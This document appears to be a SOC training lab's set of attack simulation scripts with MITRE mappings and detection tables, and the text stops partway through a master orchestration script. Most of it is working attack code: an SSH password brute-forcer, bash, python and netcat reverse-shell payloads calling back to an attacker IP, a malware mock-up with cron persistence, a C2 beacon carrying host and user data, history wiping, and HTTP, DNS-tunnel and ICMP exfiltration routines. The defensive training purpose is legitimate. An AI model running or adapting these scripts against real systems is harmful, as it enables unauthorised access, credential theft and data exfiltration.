# ⚔️ CyberBlue SOC Lab — Attack Simulation Scripts

> ⚠️ **FOR ISOLATED LAB USE ONLY. Never run against systems you don't own.**

---

## Script 1 — `01_recon_scan.sh`
### Port Scanning + Service Enumeration
**MITRE ATT&CK:** T1046 — Network Service Discovery | T1595 — Active Scanning

```bash
#!/bin/bash
# =============================================================
# Script   : 01_recon_scan.sh
# Author   : CyberBlue Red Team Lab
# Purpose  : Simulate attacker reconnaissance — port scan +
#            service/version enumeration against a target VM
# MITRE    : T1046, T1595.001, T1595.002
# WARNING  : Lab use only — isolated network required
# =============================================================

# ─── PARAMETERS (customize here) ────────────────────────────
TARGET_IP="192.168.1.100"          # Target VM IP
OUTPUT_DIR="/tmp/lab_recon"        # Where to save results
SCAN_SPEED="T4"                    # Nmap timing (T1=slow, T5=insane)
# ────────────────────────────────────────────────────────────

# Colors for output
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'

echo -e "${RED}[*] CyberBlue Attack Sim — Recon Module${NC}"
echo -e "${YELLOW}[!] Target: $TARGET_IP${NC}"
echo "-------------------------------------------"

# Create output directory
mkdir -p "$OUTPUT_DIR"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOG="$OUTPUT_DIR/recon_$TIMESTAMP.log"

log() { echo -e "$1" | tee -a "$LOG"; }

# ─── PHASE 1: ICMP Ping Check ───────────────────────────────
log "${GREEN}[PHASE 1] Checking if target is alive...${NC}"
if ping -c 3 -W 2 "$TARGET_IP" &>/dev/null; then
    log "${GREEN}[+] Target $TARGET_IP is UP${NC}"
else
    log "${RED}[-] Target $TARGET_IP is DOWN or blocking ICMP${NC}"
    log "[*] Continuing scan anyway..."
fi

sleep 2

# ─── PHASE 2: Fast Top-Port TCP Scan ────────────────────────
log "\n${GREEN}[PHASE 2] Fast TCP scan — top 1000 ports...${NC}"
nmap -sS -${SCAN_SPEED} --open -oN "$OUTPUT_DIR/tcp_fast_$TIMESTAMP.txt" "$TARGET_IP" 2>&1 | tee -a "$LOG"

sleep 3

# ─── PHASE 3: Service + Version Detection ───────────────────
log "\n${GREEN}[PHASE 3] Service and version enumeration...${NC}"
nmap -sV -sC -${SCAN_SPEED} -p 21,22,23,25,80,443,445,3306,3389,8080,8443 \
    --version-intensity 5 \
    -oN "$OUTPUT_DIR/services_$TIMESTAMP.txt" \
    "$TARGET_IP" 2>&1 | tee -a "$LOG"

sleep 3

# ─── PHASE 4: OS Fingerprinting ─────────────────────────────
log "\n${GREEN}[PHASE 4] OS fingerprinting...${NC}"
sudo nmap -O --osscan-guess -${SCAN_SPEED} \
    -oN "$OUTPUT_DIR/os_$TIMESTAMP.txt" \
    "$TARGET_IP" 2>&1 | tee -a "$LOG"

sleep 2

# ─── PHASE 5: UDP Scan (top ports only — slow) ──────────────
log "\n${GREEN}[PHASE 5] UDP top-20 scan...${NC}"
sudo nmap -sU --top-ports 20 -${SCAN_SPEED} \
    -oN "$OUTPUT_DIR/udp_$TIMESTAMP.txt" \
    "$TARGET_IP" 2>&1 | tee -a "$LOG"

# ─── PHASE 6: NSE Vulnerability Scripts ─────────────────────
log "\n${GREEN}[PHASE 6] Running Nmap vuln scripts...${NC}"
nmap --script=vuln,auth,default -${SCAN_SPEED} \
    -oN "$OUTPUT_DIR/vulns_$TIMESTAMP.txt" \
    "$TARGET_IP" 2>&1 | tee -a "$LOG"

# ─── SUMMARY ────────────────────────────────────────────────
log "\n${GREEN}[+] Recon complete. Results saved to: $OUTPUT_DIR${NC}"
log "[+] Log file: $LOG"
ls -lh "$OUTPUT_DIR/"
```

**Detection Mapping:**

| Tool | What It Sees |
|------|-------------|
| **Wazuh** | IDS rule 40101 fires — port scan detected; multiple connection attempts from single source IP in short window |
| **Arkime** | Burst of SYN packets to 1000+ ports; half-open TCP sessions; OS fingerprint probes (TTL/window manipulation) |
| **EveBox** | Suricata `ET SCAN Nmap` and `ET SCAN Nmap Scripting Engine` signatures fire; `ET SCAN NMAP OS Detection` alert |
| **Velociraptor** | Network connection artifacts show mass outbound connections from Kali; endpoint sees massive inbound SYN flood |

---

## Script 2 — `02_ssh_bruteforce.py`
### SSH Brute Force Attack
**MITRE ATT&CK:** T1110.001 — Brute Force: Password Guessing

```python
#!/usr/bin/env python3
# =============================================================
# Script   : 02_ssh_bruteforce.py
# Purpose  : Simulate SSH brute force credential attack
# MITRE    : T1110.001 — Brute Force: Password Guessing
# Requires : pip install paramiko
# WARNING  : Lab use only — isolated network required
# =============================================================

import paramiko
import time
import sys
import os
from datetime import datetime

# ─── PARAMETERS (customize here) ────────────────────────────
TARGET_IP   = "192.168.1.100"      # Target IP
TARGET_PORT = 22                   # SSH port
USERNAMES   = ["root", "admin", "user", "ubuntu", "kali"]
WORDLIST    = "/usr/share/wordlists/rockyou.txt"  # Password wordlist
MAX_ATTEMPTS = 50                  # Max attempts before stopping (safety limit)
DELAY        = 0.3                 # Seconds between attempts (be realistic)
TIMEOUT      = 5                   # SSH connection timeout
LOG_FILE     = "/tmp/lab_bruteforce.log"
# ────────────────────────────────────────────────────────────

# ANSI Colors
RED = '\033[91m'; GREEN = '\033[92m'; YELLOW = '\033[93m'; RESET = '\033[0m'

def log(msg, level="INFO"):
    timestamp = datetime.now().strftime("%H:%M:%S")
    line = f"[{timestamp}] [{level}] {msg}"
    print(line)
    with open(LOG_FILE, "a") as f:
        f.write(line + "\n")

def try_ssh(ip, port, username, password, timeout):
    """Attempt a single SSH connection with given credentials."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            hostname=ip,
            port=port,
            username=username,
            password=password,
            timeout=timeout,
            banner_timeout=timeout,
            look_for_keys=False,
            allow_agent=False
        )
        client.close()
        return True  # SUCCESS
    except paramiko.AuthenticationException:
        return False  # Wrong credentials
    except paramiko.SSHException as e:
        log(f"SSH error: {e}", "WARN")
        return False
    except Exception as e:
        log(f"Connection failed: {e}", "WARN")
        return False

def load_passwords(wordlist_path, limit):
    """Load passwords from wordlist, up to limit."""
    if not os.path.exists(wordlist_path):
        log(f"Wordlist not found: {wordlist_path}", "ERROR")
        # Fallback to small built-in list
        return ["password", "123456", "admin", "root", "toor",
                "password123", "letmein", "qwerty", "1234", "admin123"]
    passwords = []
    with open(wordlist_path, "r", encoding="latin-1") as f:
        for i, line in enumerate(f):
            if i >= limit:
                break
            passwords.append(line.strip())
    return passwords

def main():
    log("="*55)
    log("CyberBlue Attack Sim — SSH Brute Force Module")
    log(f"Target  : {TARGET_IP}:{TARGET_PORT}")
    log(f"Users   : {USERNAMES}")
    log(f"Max attempts per user: {MAX_ATTEMPTS}")
    log("="*55)

    passwords = load_passwords(WORDLIST, MAX_ATTEMPTS)
    log(f"Loaded {len(passwords)} passwords from wordlist")

    found_credentials = []
    total_attempts = 0

    for username in USERNAMES:
        log(f"\n[>] Brute forcing user: {username}", "ATTACK")

        for password in passwords:
            total_attempts += 1
            log(f"  Trying {username}:{password}", "TRY")

            success = try_ssh(TARGET_IP, TARGET_PORT, username, password, TIMEOUT)

            if success:
                log(f"{GREEN}[!!!] CREDENTIALS FOUND: {username}:{password}{RESET}", "SUCCESS")
                found_credentials.append((username, password))
                break  # Move to next username
            else:
                log(f"  [-] Failed: {username}:{password}", "FAIL")

            time.sleep(DELAY)  # Realistic delay between attempts

        log(f"[*] Finished user {username} — {total_attempts} total attempts")

    # ─── SUMMARY ────────────────────────────────────────────
    log("\n" + "="*55)
    log(f"Brute Force Complete — {total_attempts} total attempts")
    if found_credentials:
        log(f"{GREEN}Found credentials:{RESET}")
        for user, pwd in found_credentials:
            log(f"  >> {user}:{pwd}")
    else:
        log("No credentials found in attempted passwords")
    log(f"Full log saved to: {LOG_FILE}")
    log("="*55)

if __name__ == "__main__":
    main()
```

**Detection Mapping:**

| Tool | What It Sees |
|------|-------------|
| **Wazuh** | Rule 5710 (SSH auth failure) fires rapidly; rule 5712 (multiple failures same source) escalates to level 10; brute force decoder aggregates events |
| **Arkime** | Many short TCP sessions to port 22; all from same source IP; SSH banner exchange followed by disconnect visible |
| **EveBox** | Suricata `ET SCAN SSH BruteForce` rule fires after threshold; `ET POLICY SSH session` alerts |
| **Velociraptor** | `/var/log/auth.log` artifact shows mass `Failed password` entries; `lastb` command shows failed login history |

---

## Script 3 — `03_reverse_shell.sh`
### Reverse Shell Simulation
**MITRE ATT&CK:** T1059.004 — Unix Shell | T1071.001 — Web Protocols

```bash
#!/bin/bash
# =============================================================
# Script   : 03_reverse_shell.sh
# Purpose  : Simulate reverse shell establishment from target
#            back to attacker (Kali). Simulates post-exploit
#            C2 communication channel.
# MITRE    : T1059.004, T1071.001, T1105
# WARNING  : Lab use only — isolated network required
#
# HOW TO USE:
#   1. Run this script on Kali FIRST (it starts the listener)
#   2. Manually trigger the reverse shell on the target VM
#      (simulating an exploit that gave you code execution)
# =============================================================

# ─── PARAMETERS (customize here) ────────────────────────────
KALI_IP="192.168.1.50"             # Your Kali machine IP
LISTEN_PORT=4444                   # Port to listen on (Kali)
TARGET_IP="192.168.1.100"          # Target VM (for reference)
SESSION_DURATION=30                # How long to keep shell open (seconds)
LOG_FILE="/tmp/lab_revshell.log"
# ────────────────────────────────────────────────────────────

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'

log() {
    echo -e "[$(date +%H:%M:%S)] $1" | tee -a "$LOG_FILE"
}

echo -e "${RED}"
cat << 'BANNER'
  ____                                  ____  _          _ _
 |  _ \ _____   _____ _ __ ___  ___   / ___|| |__   ___| | |
 | |_) / _ \ \ / / _ \ '__/ __|/ _ \  \___ \| '_ \ / _ \ | |
 |  _ <  __/\ V /  __/ |  \__ \  __/   ___) | | | |  __/ | |
 |_| \_\___| \_/ \___|_|  |___/\___|  |____/|_| |_|\___|_|_|
BANNER
echo -e "${NC}"

log "[*] CyberBlue Attack Sim — Reverse Shell Module"
log "[*] Kali Listener: $KALI_IP:$LISTEN_PORT"
log "[*] Simulated target: $TARGET_IP"

# ─── PHASE 1: Start Netcat listener on Kali ─────────────────
log "\n${GREEN}[PHASE 1] Starting listener on port $LISTEN_PORT...${NC}"
log "[!] Waiting for incoming connection..."

# Create a script to simulate what would run ON the target
# (In a real scenario this would be triggered by an exploit)
PAYLOAD_SCRIPT="/tmp/lab_payload_$$.sh"
cat > "$PAYLOAD_SCRIPT" << PAYLOAD
#!/bin/bash
# This simulates the reverse shell payload that would execute on the TARGET
# In reality, an attacker would trigger this via a vulnerability
# For lab purposes, run this manually ON the target VM:

echo "[TARGET] Establishing reverse shell to $KALI_IP:$LISTEN_PORT"

# Option 1: Bash reverse shell
bash -i >& /dev/tcp/$KALI_IP/$LISTEN_PORT 0>&1

# Option 2: Python reverse shell (if bash fails)
# python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("$KALI_IP",$LISTEN_PORT)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'

# Option 3: Netcat reverse shell
# nc -e /bin/sh $KALI_IP $LISTEN_PORT
PAYLOAD

chmod +x "$PAYLOAD_SCRIPT"
log "[*] Payload script created at: $PAYLOAD_SCRIPT"
log "[*] Copy and run this on the TARGET VM to simulate the reverse shell"

# ─── PHASE 2: Start the listener ────────────────────────────
log "\n${GREEN}[PHASE 2] Starting Netcat listener...${NC}"
log "[!] Run the payload on the target VM now. Waiting $SESSION_DURATION seconds..."

# Start nc listener with timeout
timeout "$SESSION_DURATION" nc -lvnp "$LISTEN_PORT" 2>&1 | while read -r line; do
    log "[SHELL] $line"
    # If we get a connection, run some enumeration commands
    if echo "$line" | grep -q "connect"; then
        log "${GREEN}[+] Reverse shell connection received!${NC}"
    fi
done

# ─── PHASE 3: Simulate post-exploitation commands ────────────
log "\n${GREEN}[PHASE 3] Simulating post-exploitation commands (for detection)...${NC}"
log "[*] Generating network traffic patterns typical of C2 communication..."

# Generate realistic C2-like traffic patterns (safe simulation)
for i in $(seq 1 5); do
    log "  [C2 Beacon $i] Simulating heartbeat to $KALI_IP:$LISTEN_PORT"
    echo "beacon_$i" | nc -w 1 "$KALI_IP" "$LISTEN_PORT" 2>/dev/null || true
    sleep $((RANDOM % 10 + 5))  # Random jitter — realistic C2 behavior
done

# ─── PHASE 4: Simulate download of "tool" ───────────────────
log "\n${GREEN}[PHASE 4] Simulating tool download (T1105 - Ingress Tool Transfer)...${NC}"
# Safe simulation — just curl a harmless file
curl -s -o /tmp/lab_sim_download.txt "http://$TARGET_IP/robots.txt" 2>/dev/null || \
    echo "SIMULATED_TOOL_DOWNLOAD" > /tmp/lab_sim_download.txt
log "[*] Simulated file download complete: /tmp/lab_sim_download.txt"

log "\n${GREEN}[+] Reverse shell simulation complete. Check SOC tools for detections.${NC}"
log "[+] Log saved to: $LOG_FILE"
```

**Detection Mapping:**

| Tool | What It Sees |
|------|-------------|
| **Wazuh** | Rule fires on bash spawning with I/O redirection (`>&`); suspicious process spawning child shell; outbound connection from shell process |
| **Arkime** | Persistent TCP session on non-standard port (4444) between target and Kali; long-duration session with interactive data exchange |
| **EveBox** | Suricata `ET POLICY Reverse Shell` and `ET SHELLCODE` signatures; `ET MALWARE Generic - HTTP Response to Suspicious` |
| **Velociraptor** | Process with open socket — `bash` with STDIN/STDOUT pointing to socket; `Generic.Detection.Network` hunt catches outbound shell |

---

## Script 4 — `04_malware_simulation.sh`
### Malware Drop + Execution Simulation
**MITRE ATT&CK:** T1105 — Ingress Tool Transfer | T1059 — Command Interpreter | T1036 — Masquerading

```bash
#!/bin/bash
# =============================================================
# Script   : 04_malware_simulation.sh
# Purpose  : Simulate attacker dropping and executing a
#            "malware" payload. Uses a harmless script that
#            mimics malware behavior patterns without any
#            destructive actions.
# MITRE    : T1105, T1059.004, T1036.005, T1053.003
# WARNING  : Lab use only. NO real malware. Simulation only.
# =============================================================

# ─── PARAMETERS ─────────────────────────────────────────────
TARGET_IP="192.168.1.100"          # Target VM IP
KALI_IP="192.168.1.50"             # Kali IP (simulated C2)
FAKE_MALWARE_NAME="svchost"        # Disguised process name (T1036 masquerading)
STAGING_DIR="/tmp/.cache_update"   # Hidden staging directory
C2_PORT=8080                       # Simulated C2 port
LOG_FILE="/tmp/lab_malware_sim.log"
# ────────────────────────────────────────────────────────────

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'

log() { echo -e "[$(date +%H:%M:%S)] $1" | tee -a "$LOG_FILE"; }

log "${RED}[*] CyberBlue Attack Sim — Malware Simulation Module${NC}"
log "[!] This is a SAFE simulation. No real malware."
log "---------------------------------------------------"

# ─── PHASE 1: Create fake "malware" (harmless script) ────────
log "\n${GREEN}[PHASE 1] Creating simulated malware payload...${NC}"

# Create hidden staging directory (mimics real malware behavior)
mkdir -p "$STAGING_DIR"
log "[*] Created staging directory: $STAGING_DIR (T1036 - hidden location)"

# The "malware" script — completely harmless, just mimics behaviors
FAKE_MALWARE="$STAGING_DIR/$FAKE_MALWARE_NAME"
cat > "$FAKE_MALWARE" << 'MALWARE_SIM'
#!/bin/bash
# SIMULATED MALWARE — HARMLESS LAB SCRIPT
# Mimics: persistence, C2 beacon, data staging, process injection indicators
# =============================================================

LOG="/tmp/lab_malware_activity.log"
C2_SERVER="192.168.1.50"
C2_PORT="8080"

log_activity() { echo "[$(date)] $1" >> "$LOG"; echo "$1"; }

# Simulate: T1547.001 — Startup persistence (writes to cron — non-destructive)
log_activity "[PERSIST] Simulating cron persistence entry..."
echo "# CYBERBLUE_SIM # * * * * * /tmp/.cache_update/svchost" | \
    crontab -l 2>/dev/null | grep -v CYBERBLUE_SIM | \
    { cat; echo "# CYBERBLUE_SIM_MARKER"; } | crontab - 2>/dev/null
log_activity "[PERSIST] Cron entry written (simulate T1053.003)"

# Simulate: T1082 — System Information Discovery
log_activity "[RECON] Collecting system info..."
SYSINFO=$(uname -a; id; hostname; ip addr show 2>/dev/null | grep inet)
echo "$SYSINFO" > /tmp/.cache_update/sysinfo.txt
log_activity "[RECON] System info staged at /tmp/.cache_update/sysinfo.txt"

# Simulate: T1083 — File and Directory Discovery
log_activity "[RECON] Enumerating interesting files..."
find /home /tmp /var/www 2>/dev/null -name "*.conf" -o -name "*.env" \
    -o -name "*.key" 2>/dev/null | head -20 > /tmp/.cache_update/files.txt
log_activity "[RECON] File list staged"

# Simulate: T1041 — C2 Beacon (harmless HTTP request)
log_activity "[C2] Sending beacon to C2 server..."
BEACON_DATA="host=$(hostname)&user=$(id -un)&ts=$(date +%s)"
curl -s -m 5 "http://$C2_SERVER:$C2_PORT/beacon?$BEACON_DATA" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
    -o /dev/null 2>/dev/null
log_activity "[C2] Beacon sent (T1071.001)"

# Simulate: T1560 — Data staging / archiving
log_activity "[EXFIL] Staging collected data..."
tar czf /tmp/.cache_update/staged_data.tar.gz \
    /tmp/.cache_update/sysinfo.txt \
    /tmp/.cache_update/files.txt 2>/dev/null
log_activity "[EXFIL] Data archived for exfiltration (T1560.001)"

# Simulate: Cleanup (T1070 — Indicator Removal)
log_activity "[CLEANUP] Removing indicators..."
history -c 2>/dev/null
unset HISTFILE 2>/dev/null

log_activity "[DONE] Simulation complete. All actions logged at $LOG"
MALWARE_SIM

chmod +x "$FAKE_MALWARE"
log "[+] Simulated malware created: $FAKE_MALWARE"

# ─── PHASE 2: Simulate "download" via HTTP ───────────────────
log "\n${GREEN}[PHASE 2] Simulating malware delivery (T1105)...${NC}"
log "[*] Pretending to download payload from attacker's HTTP server..."
# In a real attack this would be: curl http://attacker/payload -o /tmp/evil
# We just copy the already-created file to simulate the download artifact
cp "$FAKE_MALWARE" /tmp/update_service
chmod +x /tmp/update_service
log "[+] Payload 'downloaded' to /tmp/update_service"

# ─── PHASE 3: Execute the simulated malware ──────────────────
log "\n${GREEN}[PHASE 3] Executing simulated malware...${NC}"
log "[*] Running with masqueraded name: $FAKE_MALWARE_NAME (T1036)"
bash "$FAKE_MALWARE"

# ─── PHASE 4: Simulate process injection indicator ───────────
log "\n${GREEN}[PHASE 4] Simulating process injection indicator (T1055)...${NC}"
log "[*] Launching suspicious child process from unexpected parent..."
# Spawn a shell from a non-interactive process (mimics injection)
bash -c "sleep 5 & echo 'INJECTION_SIM_PID='$!" 2>/dev/null
log "[*] Suspicious process spawned (check Velociraptor process tree)"

log "\n${GREEN}[+] Malware simulation complete!${NC}"
log "[*] Artifacts created:"
log "    - $STAGING_DIR/ (staging dir)"
log "    - /tmp/update_service (dropped payload)"
log "    - /tmp/lab_malware_activity.log (activity log)"
log "[+] Main log: $LOG_FILE"

# ─── CLEANUP NOTE ────────────────────────────────────────────
log "\n${YELLOW}[CLEANUP] To clean up after lab:${NC}"
log "    rm -rf $STAGING_DIR /tmp/update_service /tmp/lab_malware*.log"
log "    crontab -l | grep -v CYBERBLUE_SIM | crontab -"
```

**Detection Mapping:**

| Tool | What It Sees |
|------|-------------|
| **Wazuh** | File creation in hidden directory; cron modification rule (rule 552); new executable in /tmp; suspicious `find` command execution by non-root |
| **Arkime** | HTTP beacon to C2 IP:8080 with suspicious User-Agent; `tar` followed by outbound connection pattern |
| **EveBox** | Suricata `ET MALWARE` beacon pattern; `ET POLICY curl user-agent`; HTTP to non-standard port |
| **Velociraptor** | `Windows.Persistence.ScheduledTasks` / cron artifact hunt; process spawning from `/tmp`; `Generic.Detection.Yara` on staged files |

---

## Script 5 — `05_data_exfiltration.py`
### Data Exfiltration Simulation (DNS + HTTP)
**MITRE ATT&CK:** T1048 — Exfiltration Over Alternative Protocol | T1041 — Exfiltration Over C2

```python
#!/usr/bin/env python3
# =============================================================
# Script   : 05_data_exfiltration.py
# Purpose  : Simulate data exfiltration techniques:
#            1. HTTP POST exfiltration (T1041)
#            2. DNS tunneling simulation (T1048.003)
#            3. ICMP covert channel simulation (T1048.003)
# MITRE    : T1048, T1041, T1048.003, T1560
# Requires : pip install requests dnspython scapy
# WARNING  : Lab use only — isolated network required
# =============================================================

import socket
import time
import base64
import random
import string
import os
import json
import subprocess
from datetime import datetime

# ─── PARAMETERS (customize here) ────────────────────────────
C2_IP         = "192.168.1.50"     # Kali / attacker C2 IP
C2_HTTP_PORT  = 8080               # HTTP exfil port
C2_DNS_PORT   = 5353               # DNS tunnel port (local test)
FAKE_DOMAIN   = "updates.microsoft-cdn.com"  # Fake C2 domain (not real)
CHUNK_SIZE    = 30                 # DNS label chunk size (mimics tunneling)
LOG_FILE      = "/tmp/lab_exfil.log"
SENSITIVE_DATA_FILE = "/tmp/lab_staged_data.txt"
# ────────────────────────────────────────────────────────────

RED = '\033[91m'; GREEN = '\033[92m'; YELLOW = '\033[93m'; RESET = '\033[0m'

def log(msg, level="INFO"):
    timestamp = datetime.now().strftime("%H:%M:%S")
    line = f"[{timestamp}] [{level}] {msg}"
    print(line)
    with open(LOG_FILE, "a") as f:
        f.write(line + "\n")

def create_fake_sensitive_data():
    """Create fake 'sensitive' data to simulate exfiltration."""
    data = {
        "hostname": socket.gethostname(),
        "users": ["admin", "user1", "svc_account"],
        "fake_passwords": ["REDACTED_HASH_1", "REDACTED_HASH_2"],
        "internal_ips": ["10.0.0.1", "10.0.0.2", "192.168.1.1"],
        "fake_api_key": "SIMULATED_KEY_" + ''.join(random.choices(string.ascii_uppercase, k=16)),
        "note": "THIS IS SIMULATED DATA — CyberBlue SOC Lab"
    }
    with open(SENSITIVE_DATA_FILE, "w") as f:
        json.dump(data, f, indent=2)
    log(f"Created fake sensitive data: {SENSITIVE_DATA_FILE}")
    return json.dumps(data)

def exfil_http_post(data, c2_ip, port):
    """
    T1041 — Exfiltration over HTTP POST
    Mimics malware sending data to C2 via HTTP
    """
    log("="*50)
    log("METHOD 1: HTTP POST Exfiltration (T1041)", "ATTACK")
    log("="*50)

    # Encode data to base64 (mimics obfuscation)
    encoded = base64.b64encode(data.encode()).decode()
    log(f"Data encoded to base64: {encoded[:40]}...", "INFO")

    # Craft request to simulate C2 communication
    payload = f"d={encoded}&t={int(time.time())}&h={socket.gethostname()}"

    # Use socket directly (avoid requests dependency for stealth sim)
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((c2_ip, port))

        # Craft HTTP POST with suspicious but realistic headers
        http_request = (
            f"POST /api/telemetry HTTP/1.1\r\n"
            f"Host: {c2_ip}:{port}\r\n"
            f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            f"AppleWebKit/537.36\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(payload)}\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
            f"{payload}"
        )

        sock.send(http_request.encode())
        response = sock.recv(1024)
        sock.close()
        log(f"HTTP POST sent to {c2_ip}:{port} — Response: {len(response)} bytes", "SUCCESS")
    except Exception as e:
        log(f"HTTP POST failed (C2 not listening): {e} — Simulating traffic pattern anyway", "WARN")
        # Still log that the attempt was made (Wazuh/Arkime see the TCP SYN)

    time.sleep(2)

def exfil_dns_tunnel(data, domain):
    """
    T1048.003 — Exfiltration over DNS
    Encodes data into DNS subdomain queries
    (Makes queries that look like DNS tunneling to IDS)
    """
    log("="*50)
    log("METHOD 2: DNS Tunneling Simulation (T1048.003)", "ATTACK")
    log("="*50)

    # Encode data to base32 (DNS-safe characters)
    encoded = base64.b32encode(data.encode()).decode().rstrip("=").lower()
    log(f"Data encoded for DNS: {encoded[:40]}...", "INFO")

    # Split into DNS-sized chunks (max 63 chars per label)
    chunks = [encoded[i:i+CHUNK_SIZE] for i in range(0, len(encoded), CHUNK_SIZE)]
    log(f"Split into {len(chunks)} DNS chunks", "INFO")

    # Send each chunk as a DNS query subdomain
    # Pattern: <chunk_N>.<seq>.<domain> — classic DNS tunnel pattern
    for i, chunk in enumerate(chunks):
        # Build tunneling-style subdomain
        query = f"{chunk}.{i:03d}.exfil.{domain}"
        log(f"  DNS Query [{i+1}/{len(chunks)}]: {query}", "SEND")

        try:
            # Actually make the DNS query (will fail for fake domain — that's fine)
            # The query ITSELF is what Suricata/Arkime detects
            socket.getaddrinfo(query, None)
        except socket.gaierror:
            pass  # Expected — domain doesn't exist, but query was made
        except Exception as e:
            pass

        time.sleep(0.2)  # Small delay between queries

    log(f"DNS tunnel simulation complete — {len(chunks)} queries sent", "SUCCESS")
    time.sleep(2)

def exfil_icmp_simulation(data, target_ip):
    """
    T1048.003 — Exfiltration over ICMP (covert channel simulation)
    Uses ping with custom payload size to signal data (timing channel)
    """
    log("="*50)
    log("METHOD 3: ICMP Covert Channel Simulation (T1048.003)", "ATTACK")
    log("="*50)

    # Encode data as varying ping packet sizes (timing/size covert channel)
    encoded = base64.b64encode(data.encode()).decode()
    log(f"Encoding {len(data)} bytes into ICMP size variation pattern", "INFO")

    # Each byte of data represented as ping packet size variation
    for i, char in enumerate(encoded[:20]):  # Limit to 20 chars for demo
        # Map character value to packet size (56-120 byte range)
        packet_size = 56 + (ord(char) % 64)
        log(f"  ICMP packet {i+1}: size={packet_size} bytes (encoding '{char}')", "SEND")

        try:
            subprocess.run(
                ["ping", "-c", "1", "-s", str(packet_size), "-W", "1", target_ip],
                capture_output=True, timeout=3
            )
        except Exception:
            pass

        time.sleep(0.5)

    log("ICMP covert channel simulation complete", "SUCCESS")

def main():
    log("="*55)
    log("CyberBlue Attack Sim — Data Exfiltration Module")
    log(f"C2 Server: {C2_IP}:{C2_HTTP_PORT}")
    log(f"Fake Domain: {FAKE_DOMAIN}")
    log("="*55)

    # Step 1: Create fake sensitive data to exfiltrate
    log("\n[STAGE 1] Creating fake sensitive data to exfiltrate...")
    sensitive_data = create_fake_sensitive_data()
    log(f"Staged {len(sensitive_data)} bytes of fake data")
    time.sleep(2)

    # Step 2: HTTP POST exfiltration
    log("\n[STAGE 2] HTTP exfiltration...")
    exfil_http_post(sensitive_data, C2_IP, C2_HTTP_PORT)

    # Step 3: DNS tunneling simulation
    log("\n[STAGE 3] DNS tunnel exfiltration...")
    exfil_dns_tunnel(sensitive_data, FAKE_DOMAIN)

    # Step 4: ICMP covert channel
    log("\n[STAGE 4] ICMP covert channel...")
    exfil_icmp_simulation(sensitive_data, C2_IP)

    # Summary
    log("\n" + "="*55)
    log("Exfiltration simulation complete")
    log(f"Methods used: HTTP POST, DNS Tunnel, ICMP Covert Channel")
    log(f"Data volume: {len(sensitive_data)} bytes")
    log(f"Log saved to: {LOG_FILE}")
    log("="*55)

if __name__ == "__main__":
    main()
```

**Detection Mapping:**

| Tool | What It Sees |
|------|-------------|
| **Wazuh** | High-frequency DNS queries rule; outbound HTTP to non-standard port; ICMP packet size anomaly rule |
| **Arkime** | HTTP POST with base64 body to C2; DNS queries with abnormally long subdomains (30+ chars); ICMP packets with varying unusual sizes |
| **EveBox** | `ET DNS Tunnel` signature; `ET POLICY base64 in HTTP POST`; `ET POLICY ICMP Large ICMP Packet` |
| **Velociraptor** | `Generic.Network.NetstatEnriched` shows outbound to C2; DNS query artifacts; ICMP anomaly in network hunt |

---

## 🎯 Master Script — `00_master_attack_sim.sh`
### Full Attack Chain Automation

```bash
#!/bin/bash
# =============================================================
# Script   : 00_master_attack_sim.sh
# Purpose  : Master orchestrator — runs all 5 attack modules
#            sequentially with realistic delays, full logging,
#            and progress tracking.
# Flow     : Recon → Brute Force → Reverse Shell →
#            Malware Sim → Data Exfiltration
# WARNING  : Lab use only — isolated network required
# =============================================================

# ─── MASTER PARAMETERS ───────────────────────────────────────
TARGET_IP="192.168.1.100"          # Target VM IP
KALI_IP="192.168.1.50"             # This machine (Kali) IP
SCRIPTS_DIR="$(dirname "$0")"      # Directory containing scripts
MASTER_LOG="/tmp/lab_master_$(date +%Y%m%d_%H%M%S).log"
DELAY_SHORT=10                     # Seconds between attack phases
DELAY_LONG=30                      # Longer delay for realistic pacing
# ────────────────────────────────────────────────────────────

# Colors
RED='\033[0;31m'; GREEN='\033[0;32m'
YELLOW='\033[1;33m'; BLUE='\033[0;34m'
CYAN='\033[0;36m'; NC='\033[0m'
BOLD='\033[1m'

# ─── BANNER ──────────────────────────────────────────────────
clear
echo -e "${RED}${BOLD}"
cat << 'BANNER'
  ___      _               ____  _              ____
 / __|_  _| |__  ___ _ _  | __ )| |_  _ ___   / ___|  ___ _ __
| (__| || | '_ \/ -_) '_| |  _ \| | || / -_)  \___ \ / _ \ '  \
 \___|\_, |_.__/\___|_|   |____/|_|\_,_\___|  |____/ \___/_|_|_|
      |__/
         CyberBlue SOC Lab — Full Attack Chain Simulation
BANNER
echo -e "${NC}"

log_master() {
    local level="$1"; shift
    local msg="$*"
    local timestamp
    timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo -e "[$timestamp] [$level] $msg" | tee -a "$MASTER_LOG"
}

phase_banner() {
    echo -e "\n${CYAN}${BOLD}"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "  $1"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo -e "${NC}"
}

countdown() {
    local seconds=$1
    local msg="${2:-Next phase in}"
    for ((i=seconds; i>0; i--)); do
        echo -ne "\r${YELLOW}  ⏳ $msg $i seconds...${NC}  "
        sleep 1
    done
    echo -ne "\r${GREEN}  ✅ Proceeding...${NC}               \n"
}

run_phase() {
    local phase_num="$1"
    local phase_name="$2"
    local script="$3"
    local interpreter="${4:-bash}"

    phase_banner "PHASE $phase_num — $phase_name"
    log_master "PHASE" "Starting Phase $phase_num: $phase_name"

    if [[ -f "$SCRIPTS_DIR/$script" ]]; then
